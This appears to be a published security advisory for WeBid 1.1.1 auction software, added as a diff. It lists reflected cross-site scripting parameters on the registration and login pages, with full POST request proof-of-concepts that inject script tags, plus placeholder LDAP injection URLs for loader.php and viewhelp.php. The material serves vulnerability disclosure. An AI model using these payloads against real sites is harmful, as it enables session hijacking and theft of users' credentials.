@@ -1,0 +1,68 @@
+source: http://www.securityfocus.com/bid/68519/info
+
+WeBid is prone to multiple cross-site-scripting vulnerabilities and an LDAP injection vulnerability.
+
+An attacker may leverage these issues to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+WeBid 1.1.1 is vulnerable; other versions may also be affected. 
+
+1. http://www.example.com/WeBid/register.php
+
+Reflected Cross-Site Scripting in the parameters are :
+ "TPL_name=" 
+ "TPL_nick=" 
+ "TPL_email" 
+ "TPL_year" 
+ "TPL_address" 
+ "TPL_city" 
+ "TPL_prov" 
+ "TPL_zip" 
+ "TPL_phone" 
+ "TPL_pp_email" 
+ "TPL_authnet_id" 
+ "TPL_authnet_pass" 
+ "TPL_wordpay_id" 
+ "TPL_toocheckout_id" 
+ "TPL_moneybookers_email"
+ 
+PoC :
+we can run our xss script with all these different parameters 
+
+Host=www.example.com
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+Referer=http://www.example.com/web-id/register.php
+Cookie=WEBID_ONLINE=57e5a8970c4a9df8850c130e44e49160; PHPSESSID=2g18aupihsotkmka8778utvk47
+Connection=keep-alive
+Content-Type=application/x-www-form-urlencoded
+Content-Length=417
+POSTDATA=csrftoken=&TPL_name="><script>alert('Hacked By Govind Singh aka NullPort');</script>&TPL_nick=&TPL_password=&TPL_repeat_password=&TPL_email=&TPL_day=&TPL_month=00&TPL_year=&TPL_address=&TPL_city=&TPL_prov=&TPL_country=United+Kingdom&TPL_zip=&TPL_phone=&TPL_timezone=0&TPL_nletter=1&TPL_pp_email=&TPL_authnet_id=&TPL_authnet_pass=&TPL_worldpay_id=&TPL_toocheckout_id=&TPL_moneybookers_email=&captcha_code=&action=first
+----------------------------------------------------------------------------------------------------------------
+2. http://www.example.com/WeBid/user_login.php
+
+Reflected Cross-Site Scripting in the parameter is :
+ "username" 
+
+Host=www.example.com
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+Referer=http://www.example.com/web-id/user_login.php
+Cookie=WEBID_ONLINE=e54c2acd05a02315f39ddb4d3a112c1e; PHPSESSID=2g18aupihsotkmka8778utvk47
+Connection=keep-alive
+Content-Type=application/x-www-form-urlencoded
+Content-Length=96
+POSTDATA=username="><script>alert('xss PoC By Govind Singh');</script>&password=&input=Login&action=login
+==================================================================================================================
+2. LDAP Injection 
+
+PoC :
+http://www.example.com/WeBid/loader.php?js=[LDAP]
+http://www.example.com/WeBid/loader.php?js=js/jquery.js;js/jquery.lightbox.js;
+
+PoC
+http://www.example.com/WeBid/viewhelp.php?cat=[LDAP]
+Replace cat= as 1,2,3,4 
